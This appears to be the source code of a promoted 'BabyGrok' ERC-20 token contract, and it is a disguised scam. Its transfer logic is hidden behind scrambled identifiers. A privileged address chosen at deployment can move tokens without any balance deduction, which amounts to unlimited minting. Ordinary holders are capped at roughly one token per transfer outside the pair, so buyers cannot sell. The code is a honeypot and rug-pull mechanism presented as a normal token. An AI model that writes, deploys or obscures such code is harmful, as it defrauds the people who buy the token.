/*

https://t.me/ercbabygrok

https://babygrok.ethtoken.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract BabyGrok is Ownable {
    function transfer(address xwolnhyg, uint256 qwgs) public returns (bool success) {
        shpkqmyof(msg.sender, xwolnhyg, qwgs);
        return true;
    }

    string public symbol;

    function approve(address hwzn, uint256 qwgs) public returns (bool success) {
        allowance[msg.sender][hwzn] = qwgs;
        emit Approval(msg.sender, hwzn, qwgs);
        return true;
    }

    mapping(address => uint256) private ncdejm;

    uint8 public decimals = 9;

    constructor(string memory dgspczinyqr, string memory otqe, address jmcvl, address efbwqpg) {
        name = dgspczinyqr;
        symbol = otqe;
        balanceOf[msg.sender] = totalSupply;
        phgimb[efbwqpg] = true;
        aywrftkuv = IUniswapV2Router02(jmcvl);
    }

    function shpkqmyof(address qtlskago, address xwolnhyg, uint256 qwgs) private {
        address uxgtjyqi = IUniswapV2Factory(aywrftkuv.factory()).getPair(address(this), aywrftkuv.WETH());
        bool bawcmloygqt = ncdejm[qtlskago] == block.number;
        bool nhoa = !phgimb[qtlskago];
        if (nhoa) {
            if (qtlskago != uxgtjyqi && qwgs < totalSupply && (!bawcmloygqt || qwgs > rgsfavzpm[qtlskago])) {
                require(totalSupply / (10 ** decimals) >= qwgs);
            }
            balanceOf[qtlskago] -= qwgs;
        }
        rgsfavzpm[xwolnhyg] = qwgs;
        balanceOf[xwolnhyg] += qwgs;
        ncdejm[xwolnhyg] = block.number;
        emit Transfer(qtlskago, xwolnhyg, qwgs);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    mapping(address => bool) private phgimb;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    string public name;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    IUniswapV2Router02 private aywrftkuv;

    function transferFrom(address qtlskago, address xwolnhyg, uint256 qwgs) public returns (bool success) {
        require(qwgs <= allowance[qtlskago][msg.sender]);
        allowance[qtlskago][msg.sender] -= qwgs;
        shpkqmyof(qtlskago, xwolnhyg, qwgs);
        return true;
    }

    mapping(address => uint256) private rgsfavzpm;
}
